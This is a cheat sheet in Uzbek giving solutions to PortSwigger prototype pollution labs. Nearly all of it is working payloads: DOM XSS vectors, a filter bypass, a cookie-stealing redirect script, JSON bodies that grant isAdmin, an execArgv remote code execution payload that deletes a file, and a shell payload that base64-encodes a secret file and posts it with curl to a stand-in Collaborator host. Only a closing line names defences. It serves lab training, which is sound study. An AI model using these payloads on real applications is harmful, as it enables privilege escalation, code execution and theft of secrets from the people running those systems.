# Prototype Pollution — PortSwigger LAB yechimlari (cheat sheet)

> Lab host = **example.com**, exploit server = **exploit.example.net**, Collaborator = **COLLAB.example.net**.
> Source topish: `/?__proto__[foo]=bar` yoki `/?__proto__.foo=bar` → DevTools'da `Object.prototype.foo` tekshir.
> Gadget: polluted property qayerda ishlatiladi (script src, eval, isAdmin, execArgv...).

## Client-side

### DOM XSS via client-side prototype pollution — PRACTITIONER
Gadget: `config.transport_url` → `<script src>`.
```
/?__proto__[transport_url]=data:,alert(1);
```

### Alternative vector (eval sink) — PRACTITIONER
`[foo]` ishlamasa `.foo` vektori. Gadget: `manager.sequence` → `eval()`.
```
/?__proto__.sequence=alert(1)-
```
> Oxirgi `-` kerak (payloadga `1` qo'shiladi).

### Via flawed sanitization — PRACTITIONER
Blocklist non-recursive → `__proto__` ni ichiga joylab tiklaysan.
```
/?__pro__proto__to__[transport_url]=data:,alert(1);
```

### Via browser APIs (defineProperty) — PRACTITIONER
`Object.defineProperty` `value` bermagan → pollution orqali `value` ni berasan.
```
/?__proto__[value]=data:,alert(1);
```

### In third-party libraries (DOM Invader) — PRACTITIONER
DOM Invader prototype pollution + gadget scan → `hitCallback` → `setTimeout`. Exploit server:
```html
<script>location='https://example.com/#__proto__[hitCallback]=alert%28document.cookie%29'</script>
```

## Server-side (Node.js, JSON body)

### Privilege escalation — PRACTITIONER
`POST /my-account/change-address` JSON. Gadget: `isAdmin`.
```json
"__proto__": { "isAdmin": true }
```

### Detection without reflection (status override) — PRACTITIONER
Reflect yo'q → `status` ni pollute qilib error javob status'ini o'zgartirasan.
```json
"__proto__": { "status": 555 }
```
> JSON'ni sindirib 500 error chiqar → status 555 bo'lsa pollution bor. (Yoki `"json spaces":10` → indentatsiya.)

### Bypassing flawed input filters (constructor route) — PRACTITIONER
`__proto__` filtrlangan → `constructor.prototype` orqali.
```json
"constructor": { "prototype": { "isAdmin": true } }
```
> Tasdiq: `"constructor":{"prototype":{"json spaces":10}}` → indentatsiya oshadi.

### RCE (execArgv) — PRACTITIONER
Gadget: child_process `execArgv`.
```json
"__proto__": { "execArgv": [ "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')" ] }
```
> Admin maintenance job'larni ishga tushir. OOB test: `curl https://COLLAB.example.net`.

### Data exfiltration (shell + input) — PRACTITIONER
Gadget: `child_process.execSync` `shell`/`input`.
```json
"__proto__": { "shell": "vim", "input": ":! cat /home/carlos/secret | base64 | curl -d @- https://COLLAB.example.net\n" }
```
> Maintenance job → Collaborator body'ni base64-decode → secret.

---

### Eslatma
Source: `__proto__[x]`, `__proto__.x`, `constructor.prototype.x`, obfuscated (`__pro__proto__to__`).
Gadget: script src, eval, isAdmin, execArgv, shell/input. Tool: DOM Invader. Himoya:
`Object.freeze(Object.prototype)`, `Map`, `--disable-proto`. Umumiy: bu papka README.
